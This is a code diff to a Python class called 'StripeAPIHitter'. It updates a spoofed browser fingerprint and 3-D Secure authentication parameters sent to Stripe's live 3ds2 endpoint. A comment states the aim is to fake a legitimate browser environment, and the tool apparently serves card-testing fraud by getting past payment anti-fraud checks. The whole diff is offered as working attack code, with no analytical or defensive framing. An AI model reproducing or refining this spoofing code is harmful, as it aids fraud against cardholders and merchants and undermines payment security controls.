@@ -714,14 +714,20 @@ class StripeAPIHitter:
                                 
                                 if source_id:
                                     # Spoof legitimate browser environment for 3DS evaluation
+                                    # Updated to match bleeding-edge Stripe.js modern fingerprint payload
                                     browser_info = {
-                                        "color_depth": int(profile["color_depth"]),
-                                        "java_enabled": False,
-                                        "language": "en-US",
-                                        "screen_height": int(profile["screen_height"]),
-                                        "screen_width": int(profile["screen_width"]),
-                                        "timezone_offset": 240,
-                                        "user_agent": profile["user_agent"]
+                                        "fingerprintAttempted": True,
+                                        "fingerprintData": None,
+                                        "challengeWindowSize": None,
+                                        "threeDSCompInd": "Y",
+                                        "browserJavaEnabled": False,
+                                        "browserJavascriptEnabled": True,
+                                        "browserLanguage": "en-US",
+                                        "browserColorDepth": str(profile["color_depth"]),
+                                        "browserScreenHeight": str(profile["screen_height"]),
+                                        "browserScreenWidth": str(profile["screen_width"]),
+                                        "browserTZ": "-240",
+                                        "browserUserAgent": profile["user_agent"]
                                     }
                                     
                                     auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
@@ -753,8 +759,12 @@ class StripeAPIHitter:
                                             
                                     auth_data = {
                                         "source": source_id,
-                                        "app": '{"sdk_trans_id":"' + (server_trans_id or "6291d904-74a4-4dc4-b770-4cc200ffb5d4") + '"}',
                                         "browser": json.dumps(browser_info, separators=(',', ':')),
+                                        "one_click_authn_device_support[hosted]": "false",
+                                        "one_click_authn_device_support[same_origin_frame]": "false",
+                                        "one_click_authn_device_support[spc_eligible]": "false",
+                                        "one_click_authn_device_support[webauthn_eligible]": "false",
+                                        "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
                                         "key": self.pk_live
                                     }
                                     
